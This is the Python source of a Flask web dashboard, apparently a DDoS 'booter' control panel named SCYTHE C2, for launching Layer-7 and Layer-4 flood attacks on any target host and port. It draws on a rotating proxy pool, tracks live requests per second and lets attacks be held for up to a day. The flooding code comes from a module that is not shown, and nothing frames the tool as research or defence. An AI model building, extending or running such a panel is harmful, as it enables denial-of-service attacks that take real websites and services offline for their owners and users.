#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
╔═══════════════════════════════════════════════════════════════════════════════╗
║  SCYTHE WEB DASHBOARD v10.0 — FULL SYNC WITH NEW METHODS                    ║
║  🔥 6 L7 + 4 L4 METHODS                                                     ║
║  🔥 ATTACK FROM DASHBOARD ↔ C2 ↔ STATE FULL SYNC                           ║
║  🔥 LIVE RPS REAL-TIME                                                     ║
║  Built for: Alpha @scytheinhere88                                            ║
╚═══════════════════════════════════════════════════════════════════════════════╝
"""
import os
import sys
import time
import json
import re
import subprocess
import threading
import queue
import hashlib
import secrets
from datetime import datetime
from functools import wraps
from flask import Flask, render_template, jsonify, request, Response, session, redirect, url_for
from flask_cors import CORS

# ─── IMPORT STATE MANAGER ───
try:
    from state_manager import state, MAX_CONCURRENT, MAX_HOLD_TIME
except ImportError as e:
    print("[FATAL] state_manager.py not found. Run setup.sh first.")
    sys.exit(1)

# ─── IMPORT ATTACK EXECUTOR (sudah update) ───
try:
    from attack_executor import AttackExecutor, METHODS, get_vps_specs, calculate_rps_estimate, get_adaptive_threads
except ImportError as e:
    print("[FATAL] attack_executor.py not found. Run setup.sh first.")
    sys.exit(1)

# ─── FLASK APP ───
app = Flask(__name__, template_folder='templates', static_folder='static')
app.secret_key = secrets.token_hex(32)
CORS(app)
app.config['JSON_SORT_KEYS'] = False

AUTH_CODE = "665544"
SESSION_TIMEOUT = 3600

executor = AttackExecutor()
executor.start_proxy_refresh()

DASHBOARD_LOG = "dashboard_session.log"
C2_LOG = "c2_session.log"

def log_dashboard(message, level="INFO"):
    try:
        timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        with open(DASHBOARD_LOG, 'a') as f:
            f.write(f"[{timestamp}] [{level}] {message}\n")
    except:
        pass

# ─── AUTH DECORATOR ───
def require_auth(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if not session.get('authenticated'):
            if request.path.startswith('/api/'):
                auth_token = request.headers.get('X-Auth-Token')
                if auth_token and auth_token == AUTH_CODE:
                    return f(*args, **kwargs)
                return jsonify({'error': 'Authentication required', 'code': 'AUTH_REQUIRED'}), 401
            return redirect(url_for('login_page'))
        return f(*args, **kwargs)
    return decorated_function

# ─── LOGIN ───
@app.route('/login', methods=['GET', 'POST'])
def login_page():
    if request.method == 'POST':
        code = request.form.get('code', '').strip()
        if code == AUTH_CODE:
            session['authenticated'] = True
            session['login_time'] = time.time()
            log_dashboard(f"Login successful from {request.remote_addr}", "AUTH")
            return redirect(url_for('index'))
        else:
            log_dashboard(f"Login failed from {request.remote_addr}", "AUTH")
            return render_template('login.html', error='Invalid authentication code')
    if session.get('authenticated'):
        login_time = session.get('login_time', 0)
        if time.time() - login_time < SESSION_TIMEOUT:
            return redirect(url_for('index'))
        else:
            session.pop('authenticated', None)
            session.pop('login_time', None)
    return render_template('login.html', error=None)

@app.route('/logout')
def logout():
    session.pop('authenticated', None)
    session.pop('login_time', None)
    log_dashboard(f"Logout from {request.remote_addr}", "AUTH")
    return redirect(url_for('login_page'))

@app.route('/')
@require_auth
def index():
    log_dashboard(f"Dashboard accessed from {request.remote_addr}", "ACCESS")
    return render_template('dashboard.html')

# ─── API ENDPOINTS ───

@app.route('/api/status')
@require_auth
def api_status():
    data = state.get_state()
    proxy_count = executor.get_proxy_count()
    data['proxy_pool'] = proxy_count
    data['proxy_total_fetched'] = proxy_count
    data['proxy_refreshing'] = executor.proxy_running
    data['authenticated'] = True
    for attack in data.get('active_attacks', []):
        if 'threads' not in attack:
            attack['threads'] = get_adaptive_threads(attack.get('method', 'httpbypass'), attack.get('duration', 60))
    return jsonify(data)

@app.route('/api/stream')
@require_auth
def api_stream():
    def generate():
        while True:
            try:
                data = state.get_state()
                proxy_count = executor.get_proxy_count()
                data['proxy_pool'] = proxy_count
                data['proxy_total_fetched'] = proxy_count
                data['proxy_refreshing'] = executor.proxy_running
                data['authenticated'] = True
                for attack in data.get('active_attacks', []):
                    if 'threads' not in attack:
                        attack['threads'] = get_adaptive_threads(attack.get('method', 'httpbypass'), attack.get('duration', 60))
                yield f"data: {json.dumps(data)}\n\n"
                time.sleep(1)
            except GeneratorExit:
                break
            except Exception as e:
                yield f"data: {json.dumps({'error': str(e)})}\n\n"
                time.sleep(2)
    return Response(generate(), mimetype='text/event-stream', headers={
        'Cache-Control': 'no-cache',
        'X-Accel-Buffering': 'no',
        'Connection': 'keep-alive'
    })

@app.route('/api/attack', methods=['POST'])
@require_auth
def api_attack():
    try:
        data = request.get_json() or {}
        method = data.get('method', '').strip().lower()
        target = data.get('target', '').strip()
        port = str(data.get('port', '80')).strip()
        duration = data.get('duration', '60')
        hold_time = data.get('hold_time')
        if not method or not target or not port or not duration:
            return jsonify({'success': False, 'error': 'Missing required fields'}), 400
        if method not in METHODS:
            return jsonify({'success': False, 'error': f'Unknown method: {method}'}), 400
        if METHODS[method]["layer"] == 7 and not target.startswith("http"):
            target = "https://" + target
        threads = get_adaptive_threads(method, int(duration))
        success = executor.execute(method, target, port, duration, hold_time)
        if success:
            state._reload()
            active = state.state.get("active_attacks", [])
            attack_id = active[-1]["id"] if active else "unknown"
            for attack in active:
                if attack["id"] == attack_id:
                    attack["threads"] = threads
                    break
            state._save()
            log_dashboard(f"Attack launched: {method} -> {target}:{port} | Threads: {threads}", "ATTACK")
            return jsonify({
                'success': True,
                'attack_id': attack_id,
                'threads': threads,
                'message': f'Attack launched: {method} -> {target}:{port}'
            })
        else:
            return jsonify({'success': False, 'error': 'Failed to launch attack'}), 500
    except Exception as e:
        log_dashboard(f"Attack error: {str(e)}", "ERROR")
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/stop/<attack_id>', methods=['POST'])
@require_auth
def api_stop(attack_id):
    try:
        success = executor.stop_attack(attack_id)
        if success:
            log_dashboard(f"Attack stopped: {attack_id}", "STOP")
            return jsonify({'success': True, 'message': 'Attack stopped'})
        else:
            return jsonify({'success': False, 'error': 'Attack not found'}), 404
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/stopall', methods=['POST'])
@require_auth
def api_stopall():
    try:
        executor.stop_all()
        log_dashboard("All attacks stopped", "STOP")
        return jsonify({'success': True, 'message': 'All attacks stopped'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/proxy/refresh', methods=['POST'])
@require_auth
def api_proxy_refresh():
    try:
        subprocess.run(["python3", "getproxy.py"], capture_output=True, timeout=30)
        count = executor.get_proxy_count()
        log_dashboard(f"Proxy refresh: {count} proxies", "PROXY")
        return jsonify({'success': True, 'proxy_count': count})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/methods')
@require_auth
def api_methods():
    methods_list = []
    for name, info in METHODS.items():
        methods_list.append({
            'name': name,
            'layer': info['layer'],
            'type': info['type'],
            'desc': info['desc'],
            'target': info['target'],
            'adaptive_threads': get_adaptive_threads(name, 60)
        })
    return jsonify({'methods': methods_list})

@app.route('/api/vps')
@require_auth
def api_vps():
    cpu, ram, disk = get_vps_specs()
    proxy_count = executor.get_proxy_count()
    l7_rps, l4_rps = calculate_rps_estimate(proxy_count, max(len(state.state["active_attacks"]), 1))
    thread_estimates = {}
    for method in list(METHODS.keys())[:10]:
        thread_estimates[method] = get_adaptive_threads(method, 60)
    return jsonify({
        'cpu_cores': cpu,
        'ram_gb': round(ram, 1),
        'disk_gb': round(disk, 1),
        'proxy_count': proxy_count,
        'est_l7_rps': l7_rps,
        'est_l4_rps': l4_rps,
        'max_concurrent': MAX_CONCURRENT,
        'adaptive_threads': thread_estimates
    })

@app.route('/api/auth/status')
def auth_status():
    if session.get('authenticated'):
        login_time = session.get('login_time', 0)
        if time.time() - login_time < SESSION_TIMEOUT:
            return jsonify({'authenticated': True})
    return jsonify({'authenticated': False})

@app.route('/api/auth/login', methods=['POST'])
def auth_login():
    try:
        data = request.get_json() or {}
        code = data.get('code', '').strip()
        if code == AUTH_CODE:
            session['authenticated'] = True
            session['login_time'] = time.time()
            log_dashboard(f"API login successful from {request.remote_addr}", "AUTH")
            return jsonify({'success': True, 'message': 'Authenticated'})
        else:
            log_dashboard(f"API login failed from {request.remote_addr}", "AUTH")
            return jsonify({'success': False, 'error': 'Invalid code'}), 401
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)}), 500

@app.route('/api/auth/logout', methods=['POST'])
def auth_logout():
    session.pop('authenticated', None)
    session.pop('login_time', None)
    log_dashboard(f"API logout from {request.remote_addr}", "AUTH")
    return jsonify({'success': True, 'message': 'Logged out'})

@app.route('/api/logs')
@require_auth
def api_logs():
    try:
        lines = []
        if os.path.exists(C2_LOG):
            with open(C2_LOG, 'r') as f:
                c2_lines = f.readlines()[-30:]
                lines.extend([("[C2] " + l) for l in c2_lines])
        if os.path.exists(DASHBOARD_LOG):
            with open(DASHBOARD_LOG, 'r') as f:
                dash_lines = f.readlines()[-30:]
                lines.extend([("[DASH] " + l) for l in dash_lines])
        lines = lines[-50:]
        return jsonify({'logs': lines})
    except Exception as e:
        return jsonify({'error': str(e)}), 500

# ─── BACKGROUND SYNC (redundant but safe) ───
def sync_worker():
    while True:
        try:
            state._reload()
            proxy_count = executor.get_proxy_count()
            state.state['proxy_pool'] = proxy_count
            state.state['proxy_total_fetched'] = proxy_count
            state.state['proxy_refreshing'] = executor.proxy_running
            # total_rps sudah dihitung oleh state_manager, tapi kita perbarui juga
            active = state.state.get('active_attacks', [])
            total_rps = sum(a.get('rps', 0) for a in active)
            total_requests = sum(a.get('total_requests', 0) for a in active)
            total_bytes = sum(a.get('total_bytes', 0) for a in active)
            state.state['total_rps'] = total_rps
            state.state['total_requests'] = total_requests
            state.state['total_bytes'] = total_bytes
            state.state['system_status'] = 'online'
            state.state['last_updated'] = time.time()
            state._save()
        except Exception as e:
            print(f"[SYNC ERROR] {e}")
        time.sleep(1)

sync_thread = threading.Thread(target=sync_worker, daemon=True)
sync_thread.start()

# ─── CREATE TEMPLATES (jika belum ada) ───
def create_templates():
    os.makedirs('templates', exist_ok=True)
    os.makedirs('static/css', exist_ok=True)
    os.makedirs('static/js', exist_ok=True)

    if not os.path.exists('templates/login.html'):
        with open('templates/login.html', 'w') as f:
            f.write("""<!DOCTYPE html>
<html>
<head>
    <title>SCYTHE C2 Dashboard - Login</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            background: #0a0a0f;
            font-family: 'Courier New', monospace;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            overflow: hidden;
        }
        .login-container {
            background: #1a1a2e;
            padding: 50px;
            border-radius: 15px;
            border: 2px solid #6a0dad;
            box-shadow: 0 0 50px rgba(106, 13, 173, 0.3);
            width: 400px;
            text-align: center;
        }
        .login-container h1 {
            color: #a855f7;
            font-size: 28px;
            margin-bottom: 10px;
            letter-spacing: 3px;
        }
        .login-container p {
            color: #888;
            font-size: 14px;
            margin-bottom: 30px;
            letter-spacing: 1px;
        }
        .login-container input {
            width: 100%;
            padding: 15px;
            background: #0a0a1a;
            border: 2px solid #333;
            border-radius: 8px;
            color: #fff;
            font-size: 18px;
            font-family: 'Courier New', monospace;
            text-align: center;
            letter-spacing: 10px;
            outline: none;
            transition: border-color 0.3s;
        }
        .login-container input:focus {
            border-color: #a855f7;
        }
        .login-container button {
            width: 100%;
            padding: 15px;
            margin-top: 20px;
            background: #6a0dad;
            border: none;
            border-radius: 8px;
            color: #fff;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            transition: background 0.3s;
            letter-spacing: 2px;
        }
        .login-container button:hover {
            background: #8b1fc7;
        }
        .error {
            color: #ff4444;
            margin-top: 15px;
            font-size: 14px;
        }
        .footer {
            color: #444;
            font-size: 12px;
            margin-top: 20px;
        }
        .blink {
            animation: blink 1s infinite;
        }
        @keyframes blink {
            0%, 100% { opacity: 1; }
            50% { opacity: 0; }
        }
        .status-dot {
            display: inline-block;
            width: 10px;
            height: 10px;
            background: #00ff88;
            border-radius: 50%;
            margin-right: 8px;
            animation: blink 1s infinite;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h1>🔐 SCYTHE C2</h1>
        <p>Authentication Required</p>
        <form method="POST">
            <input type="password" name="code" placeholder="Enter Code" maxlength="6" autofocus>
            <button type="submit">ACCESS SYSTEM</button>
        </form>
        <div class="error">{% if error %}{{ error }}{% endif %}</div>
        <div class="footer">
            <span class="status-dot"></span> System Online<br>
            <small>Enter authentication code to continue</small>
        </div>
    </div>
</body>
</html>""")
        print("[INIT] Created login.html")

    if not os.path.exists('templates/dashboard.html'):
        with open('templates/dashboard.html', 'w') as f:
            f.write("""<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SCYTHE C2 Dashboard v10.0</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        :root {
            --bg-primary: #0a0a0f;
            --bg-secondary: #1a1a2e;
            --bg-card: #16162a;
            --accent-purple: #6a0dad;
            --accent-cyan: #00d4ff;
            --accent-green: #00ff88;
            --accent-red: #ff4444;
            --accent-yellow: #ffaa00;
            --text-primary: #e0e0e0;
            --text-secondary: #888;
            --border-color: #2a2a4a;
        }
        body {
            background: var(--bg-primary);
            color: var(--text-primary);
            font-family: 'Courier New', monospace;
            min-height: 100vh;
            overflow-x: hidden;
        }
        .header {
            background: var(--bg-secondary);
            border-bottom: 2px solid var(--accent-purple);
            padding: 15px 30px;
            display: flex;
            justify-content: space-between;
            align-items: center;
            position: sticky;
            top: 0;
            z-index: 100;
        }
        .header h1 {
            color: var(--accent-purple);
            font-size: 24px;
            letter-spacing: 3px;
        }
        .header .status {
            display: flex;
            align-items: center;
            gap: 20px;
        }
        .status-dot {
            width: 10px;
            height: 10px;
            border-radius: 50%;
            background: var(--accent-green);
            animation: pulse 1s infinite;
        }
        @keyframes pulse {
            0%, 100% { opacity: 1; transform: scale(1); }
            50% { opacity: 0.5; transform: scale(1.2); }
        }
        .container {
            padding: 20px;
            max-width: 1600px;
            margin: 0 auto;
        }
        .grid {
            display: grid;
            grid-template-columns: 1fr 1fr;
            gap: 20px;
            margin-bottom: 20px;
        }
        .grid-3 {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 20px;
            margin-bottom: 20px;
        }
        .card {
            background: var(--bg-card);
            border: 1px solid var(--border-color);
            border-radius: 12px;
            padding: 20px;
            box-shadow: 0 4px 20px rgba(0,0,0,0.3);
        }
        .card-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
            padding-bottom: 10px;
            border-bottom: 1px solid var(--border-color);
        }
        .card-title {
            color: var(--accent-cyan);
            font-size: 16px;
            font-weight: bold;
            letter-spacing: 1px;
        }
        .card-value {
            font-size: 32px;
            font-weight: bold;
            color: var(--accent-green);
        }
        .card-subtitle {
            color: var(--text-secondary);
            font-size: 12px;
            margin-top: 5px;
        }
        .stat-grid {
            display: grid;
            grid-template-columns: repeat(2, 1fr);
            gap: 15px;
        }
        .stat-item {
            background: rgba(255,255,255,0.03);
            padding: 12px;
            border-radius: 8px;
        }
        .stat-label {
            color: var(--text-secondary);
            font-size: 11px;
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        .stat-value {
            color: var(--text-primary);
            font-size: 18px;
            font-weight: bold;
            margin-top: 5px;
        }
        .attack-list {
            max-height: 400px;
            overflow-y: auto;
        }
        .attack-item {
            background: rgba(255,255,255,0.03);
            border-radius: 8px;
            padding: 15px;
            margin-bottom: 10px;
            border-left: 3px solid var(--accent-purple);
            transition: all 0.3s;
        }
        .attack-item:hover {
            background: rgba(255,255,255,0.05);
            border-left-color: var(--accent-cyan);
        }
        .attack-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 8px;
        }
        .attack-method {
            color: var(--accent-cyan);
            font-weight: bold;
            font-size: 14px;
        }
        .attack-rps {
            color: var(--accent-green);
            font-size: 18px;
            font-weight: bold;
        }
        .attack-details {
            color: var(--text-secondary);
            font-size: 12px;
            display: flex;
            gap: 15px;
            flex-wrap: wrap;
        }
        .progress-bar {
            width: 100%;
            height: 6px;
            background: rgba(255,255,255,0.1);
            border-radius: 3px;
            margin-top: 10px;
            overflow: hidden;
        }
        .progress-fill {
            height: 100%;
            background: var(--accent-purple);
            border-radius: 3px;
            transition: width 1s;
        }
        .launch-form {
            display: grid;
            grid-template-columns: repeat(4, 1fr);
            gap: 15px;
            margin-bottom: 15px;
        }
        .form-group {
            display: flex;
            flex-direction: column;
        }
        .form-group label {
            color: var(--text-secondary);
            font-size: 11px;
            text-transform: uppercase;
            letter-spacing: 1px;
            margin-bottom: 5px;
        }
        .form-group input, .form-group select {
            background: var(--bg-primary);
            border: 1px solid var(--border-color);
            border-radius: 8px;
            padding: 12px;
            color: var(--text-primary);
            font-family: 'Courier New', monospace;
            font-size: 14px;
            outline: none;
            transition: border-color 0.3s;
        }
        .form-group input:focus, .form-group select:focus {
            border-color: var(--accent-purple);
        }
        .btn {
            background: var(--accent-purple);
            color: white;
            border: none;
            border-radius: 8px;
            padding: 12px 24px;
            font-family: 'Courier New', monospace;
            font-size: 14px;
            font-weight: bold;
            cursor: pointer;
            transition: all 0.3s;
            letter-spacing: 1px;
        }
        .btn:hover {
            background: #8b1fc7;
            transform: translateY(-2px);
            box-shadow: 0 4px 20px rgba(106, 13, 173, 0.4);
        }
        .btn-danger {
            background: var(--accent-red);
        }
        .btn-danger:hover {
            background: #ff6666;
        }
        .btn-success {
            background: var(--accent-green);
            color: #000;
        }
        .method-tags {
            display: flex;
            flex-wrap: wrap;
            gap: 8px;
            margin-top: 15px;
        }
        .method-tag {
            background: rgba(106, 13, 173, 0.3);
            border: 1px solid var(--accent-purple);
            border-radius: 20px;
            padding: 5px 12px;
            font-size: 11px;
            cursor: pointer;
            transition: all 0.3s;
        }
        .method-tag:hover {
            background: var(--accent-purple);
        }
        .method-tag.l4 {
            border-color: var(--accent-red);
            background: rgba(255, 68, 68, 0.2);
        }
        .method-tag.l4:hover {
            background: var(--accent-red);
        }
        .log-container {
            background: var(--bg-primary);
            border-radius: 8px;
            padding: 15px;
            max-height: 300px;
            overflow-y: auto;
            font-size: 12px;
        }
        .log-line {
            color: var(--text-secondary);
            margin-bottom: 4px;
            font-family: 'Courier New', monospace;
        }
        .log-line.error { color: var(--accent-red); }
        .log-line.success { color: var(--accent-green); }
        .log-line.warn { color: var(--accent-yellow); }
        ::-webkit-scrollbar { width: 8px; }
        ::-webkit-scrollbar-track { background: var(--bg-primary); }
        ::-webkit-scrollbar-thumb { background: var(--accent-purple); border-radius: 4px; }
        @media (max-width: 1200px) {
            .grid, .grid-3 { grid-template-columns: 1fr; }
            .launch-form { grid-template-columns: 1fr 1fr; }
        }
        @media (max-width: 768px) {
            .launch-form { grid-template-columns: 1fr; }
            .header { flex-direction: column; gap: 10px; }
        }
    </style>
</head>
<body>
    <div class="header">
        <h1>⚡ SCYTHE C2 DASHBOARD v10.0</h1>
        <div class="status">
            <span style="color: var(--text-secondary);">System: <span id="system-status" style="color: var(--accent-green);">ONLINE</span></span>
            <span style="color: var(--text-secondary);">RPS: <span id="header-rps" style="color: var(--accent-cyan);">0</span></span>
            <span style="color: var(--text-secondary);">Active: <span id="header-active" style="color: var(--accent-yellow);">0/5</span></span>
            <div class="status-dot"></div>
            <a href="/logout" style="color: var(--accent-red); text-decoration: none; font-size: 12px;">[LOGOUT]</a>
        </div>
    </div>

    <div class="container">
        <div class="grid-3">
            <div class="card">
                <div class="card-header">
                    <span class="card-title">🔥 TOTAL RPS</span>
                </div>
                <div class="card-value" id="total-rps">0</div>
                <div class="card-subtitle">Requests Per Second (Live)</div>
            </div>
            <div class="card">
                <div class="card-header">
                    <span class="card-title">📊 TOTAL REQUESTS</span>
                </div>
                <div class="card-value" id="total-requests">0</div>
                <div class="card-subtitle">Cumulative Request Count</div>
            </div>
            <div class="card">
                <div class="card-header">
                    <span class="card-title">🌐 PROXY POOL</span>
                </div>
                <div class="card-value" id="proxy-count">0</div>
                <div class="card-subtitle">Active Proxies (Auto-refresh)</div>
            </div>
        </div>

        <div class="grid">
            <div class="card">
                <div class="card-header">
                    <span class="card-title">🚀 LAUNCH ATTACK</span>
                </div>
                <div class="launch-form">
                    <div class="form-group">
                        <label>Method</label>
                        <select id="launch-method">
                            <option value="">Select Method...</option>
                        </select>
                    </div>
                    <div class="form-group">
                        <label>Target</label>
                        <input type="text" id="launch-target" placeholder="example.com or IP">
                    </div>
                    <div class="form-group">
                        <label>Port</label>
                        <input type="number" id="launch-port" value="80" min="1" max="65535">
                    </div>
                    <div class="form-group">
                        <label>Duration (s)</label>
                        <input type="number" id="launch-duration" value="60" min="1">
                    </div>
                </div>
                <div class="launch-form" style="grid-template-columns: 1fr 1fr;">
                    <div class="form-group">
                        <label>Hold Time (s) [Optional]</label>
                        <input type="number" id="launch-hold" placeholder="86400" min="1">
                    </div>
                    <div class="form-group" style="justify-content: flex-end; display: flex; align-items: flex-end;">
                        <button class="btn" onclick="launchAttack()">⚡ LAUNCH</button>
                    </div>
                </div>
                <div class="method-tags" id="method-tags"></div>
            </div>

            <div class="card">
                <div class="card-header">
                    <span class="card-title">💻 SYSTEM RESOURCES</span>
                </div>
                <div class="stat-grid">
                    <div class="stat-item">
                        <div class="stat-label">CPU Usage</div>
                        <div class="stat-value" id="cpu-usage">0%</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-label">RAM Usage</div>
                        <div class="stat-value" id="ram-usage">0%</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-label">Disk Usage</div>
                        <div class="stat-value" id="disk-usage">0%</div>
                    </div>
                    <div class="stat-item">
                        <div class="stat-label">Network</div>
                        <div class="stat-value" id="network-usage">0 B</div>
                    </div>
                </div>
            </div>
        </div>

        <div class="card" style="margin-bottom: 20px;">
            <div class="card-header">
                <span class="card-title">⚔️ ACTIVE ATTACKS</span>
                <button class="btn btn-danger" onclick="stopAll()">🛑 STOP ALL</button>
            </div>
            <div class="attack-list" id="attack-list">
                <div style="text-align: center; color: var(--text-secondary); padding: 40px;">No active attacks running</div>
            </div>
        </div>

        <div class="grid">
            <div class="card">
                <div class="card-header">
                    <span class="card-title">📈 METHOD STATISTICS</span>
                </div>
                <div id="method-stats" style="max-height: 300px; overflow-y: auto;">
                    <div style="text-align: center; color: var(--text-secondary); padding: 20px;">No statistics yet</div>
                </div>
            </div>

            <div class="card">
                <div class="card-header">
                    <span class="card-title">📝 LIVE LOGS</span>
                    <button class="btn" style="padding: 5px 10px; font-size: 11px;" onclick="refreshLogs()">🔄 REFRESH</button>
                </div>
                <div class="log-container" id="log-container">
                    <div class="log-line">Waiting for logs...</div>
                </div>
            </div>
        </div>
    </div>

    <script>
        let methods = [];
        let eventSource = null;

        document.addEventListener('DOMContentLoaded', () => {
            loadMethods();
            startEventStream();
            refreshLogs();
        });

        async function loadMethods() {
            try {
                const res = await fetch('/api/methods');
                const data = await res.json();
                methods = data.methods || [];
                const select = document.getElementById('launch-method');
                select.innerHTML = '<option value="">Select Method...</option>';
                methods.forEach(m => {
                    const opt = document.createElement('option');
                    opt.value = m.name;
                    opt.textContent = `${m.name.toUpperCase()} [L${m.layer}] — ${m.desc.substring(0, 40)}...`;
                    select.appendChild(opt);
                });
                const tags = document.getElementById('method-tags');
                tags.innerHTML = '';
                methods.forEach(m => {
                    const tag = document.createElement('span');
                    tag.className = `method-tag ${m.layer === 4 ? 'l4' : ''}`;
                    tag.textContent = m.name.toUpperCase();
                    tag.onclick = () => {
                        select.value = m.name;
                        document.getElementById('launch-port').value = m.layer === 7 ? '443' : '80';
                    };
                    tags.appendChild(tag);
                });
            } catch (e) {
                console.error('Failed to load methods:', e);
            }
        }

        function startEventStream() {
            if (eventSource) eventSource.close();
            eventSource = new EventSource('/api/stream');
            eventSource.onmessage = (e) => {
                try {
                    const data = JSON.parse(e.data);
                    updateDashboard(data);
                } catch (err) {
                    console.error('SSE parse error:', err);
                }
            };
            eventSource.onerror = () => {
                setTimeout(startEventStream, 3000);
            };
        }

        function updateDashboard(data) {
            document.getElementById('header-rps').textContent = (data.total_rps || 0).toLocaleString();
            document.getElementById('header-active').textContent = `${(data.active_attacks || []).length}/${data.max_concurrent || 5}`;
            document.getElementById('system-status').textContent = (data.system_status || 'unknown').toUpperCase();
            document.getElementById('system-status').style.color = data.system_status === 'online' ? 'var(--accent-green)' : 'var(--accent-red)';
            document.getElementById('total-rps').textContent = (data.total_rps || 0).toLocaleString();
            document.getElementById('total-requests').textContent = (data.total_requests || 0).toLocaleString();
            document.getElementById('proxy-count').textContent = (data.proxy_pool || 0).toLocaleString();
            const res = data.system_resources || {};
            document.getElementById('cpu-usage').textContent = (res.cpu || 0) + '%';
            document.getElementById('ram-usage').textContent = (res.memory || 0) + '%';
            document.getElementById('disk-usage').textContent = (res.disk || 0) + '%';
            document.getElementById('network-usage').textContent = formatBytes(res.network || 0);

            const attackList = document.getElementById('attack-list');
            const active = data.active_attacks || [];
            if (active.length === 0) {
                attackList.innerHTML = '<div style="text-align: center; color: var(--text-secondary); padding: 40px;">No active attacks running</div>';
            } else {
                attackList.innerHTML = active.map(atk => {
                    const elapsed = Math.floor(Date.now() / 1000 - atk.start_time);
                    const pct = Math.min(100, (elapsed / Math.max(atk.duration, 1)) * 100);
                    return `
                        <div class="attack-item">
                            <div class="attack-header">
                                <span class="attack-method">${atk.method.toUpperCase()} [L${atk.layer}]</span>
                                <span class="attack-rps">${atk.rps || 0} RPS</span>
                            </div>
                            <div class="attack-details">
                                <span>🎯 ${atk.target}</span>
                                <span>⏱️ ${elapsed}s / ${atk.duration}s</span>
                                <span>🧵 ${atk.threads || 'auto'} threads</span>
                                <span>📊 ${(atk.total_requests || 0).toLocaleString()} req</span>
                                <span>🌐 ${atk.proxy_count_current || 0} proxies</span>
                            </div>
                            <div class="progress-bar">
                                <div class="progress-fill" style="width: ${pct}%"></div>
                            </div>
                            <button class="btn btn-danger" style="margin-top: 10px; padding: 5px 15px; font-size: 11px;" onclick="stopAttack('${atk.id}')">🛑 STOP</button>
                        </div>
                    `;
                }).join('');
            }

            const methodStats = data.method_stats || {};
            const statsContainer = document.getElementById('method-stats');
            if (Object.keys(methodStats).length === 0) {
                statsContainer.innerHTML = '<div style="text-align: center; color: var(--text-secondary); padding: 20px;">No statistics yet</div>';
            } else {
                statsContainer.innerHTML = Object.entries(methodStats).map(([name, stats]) => `
                    <div class="stat-item" style="margin-bottom: 10px;">
                        <div style="display: flex; justify-content: space-between; align-items: center;">
                            <span style="color: var(--accent-cyan); font-weight: bold;">${name.toUpperCase()}</span>
                            <span style="color: var(--accent-green); font-size: 12px;">${stats.uses || 0} uses</span>
                        </div>
                        <div style="display: flex; gap: 15px; margin-top: 5px; font-size: 11px; color: var(--text-secondary);">
                            <span>Req: ${(stats.total_requests || 0).toLocaleString()}</span>
                            <span>Peak: ${(stats.peak_rps || 0).toLocaleString()} RPS</span>
                            <span>Avg: ${(stats.avg_rps || 0).toLocaleString()} RPS</span>
                        </div>
                    </div>
                `).join('');
            }
        }

        async function launchAttack() {
            const method = document.getElementById('launch-method').value;
            const target = document.getElementById('launch-target').value;
            const port = document.getElementById('launch-port').value;
            const duration = document.getElementById('launch-duration').value;
            const hold = document.getElementById('launch-hold').value;
            if (!method || !target || !port || !duration) {
                alert('Please fill all required fields!');
                return;
            }
            try {
                const res = await fetch('/api/attack', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ method, target, port, duration, hold_time: hold || null })
                });
                const data = await res.json();
                if (data.success) {
                    alert(`✅ Attack launched!\nID: ${data.attack_id}\nThreads: ${data.threads}`);
                } else {
                    alert('❌ Failed: ' + (data.error || 'Unknown error'));
                }
            } catch (e) {
                alert('❌ Error: ' + e.message);
            }
        }

        async function stopAttack(id) {
            if (!confirm('Stop attack ' + id + '?')) return;
            try {
                await fetch('/api/stop/' + id, { method: 'POST' });
            } catch (e) {}
        }

        async function stopAll() {
            if (!confirm('Stop ALL active attacks?')) return;
            try {
                await fetch('/api/stopall', { method: 'POST' });
            } catch (e) {}
        }

        async function refreshLogs() {
            try {
                const res = await fetch('/api/logs');
                const data = await res.json();
                const container = document.getElementById('log-container');
                if (data.logs && data.logs.length > 0) {
                    container.innerHTML = data.logs.map(line => {
                        let cls = 'log-line';
                        if (line.includes('ERROR')) cls += ' error';
                        else if (line.includes('ATTACK') || line.includes('success')) cls += ' success';
                        else if (line.includes('WARN')) cls += ' warn';
                        return `<div class="${cls}">${escapeHtml(line)}</div>`;
                    }).join('');
                    container.scrollTop = container.scrollHeight;
                }
            } catch (e) {}
        }

        function formatBytes(bytes) {
            if (bytes === 0) return '0 B';
            const k = 1024;
            const sizes = ['B', 'KB', 'MB', 'GB'];
            const i = Math.floor(Math.log(bytes) / Math.log(k));
            return parseFloat((bytes / Math.pow(k, i)).toFixed(2)) + ' ' + sizes[i];
        }

        function escapeHtml(text) {
            const div = document.createElement('div');
            div.textContent = text;
            return div.innerHTML;
        }
    </script>
</body>
</html>""")
        print("[INIT] Created dashboard.html")

create_templates()

# ─── MAIN ───
if __name__ == '__main__':
    host = os.environ.get('DASHBOARD_HOST', '0.0.0.0')
    port = int(os.environ.get('DASHBOARD_PORT', 1837))
    print("╔═══════════════════════════════════════════════════════════════════════════════╗")
    print("║  SCYTHE Web Dashboard v10.0 — FULL SYNC                                      ║")
    print("║  🔥 Authentication: Code 665544 required                                     ║")
    print("║  🔥 6 L7 + 4 L4 Methods                                                      ║")
    print("║  🔥 Live RPS Real-time                                                       ║")
    print("║  🔥 Sync: C2 ↔ Dashboard ↔ State                                            ║")
